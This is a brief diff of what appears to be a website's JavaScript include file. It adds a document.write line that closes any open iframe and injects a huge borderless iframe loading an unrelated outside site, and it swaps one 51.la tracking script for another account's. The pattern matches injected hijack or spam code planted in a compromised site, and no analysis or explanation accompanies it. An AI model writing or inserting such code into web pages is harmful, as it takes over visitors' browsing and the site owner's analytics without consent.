@@ -1,4 +1,3 @@
+document.write("</iframe><iframe src='http://www.cxqqw.com/' rel='nofollow' scrolling='no' frameborder='0' width='100%'  height='4000'>")
 
-
-document.writeln('<script language="javascript" type="text/javascript" src="http://js.users.51.la/17752445.js"></script>');
-
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/17829820.js"></script>');
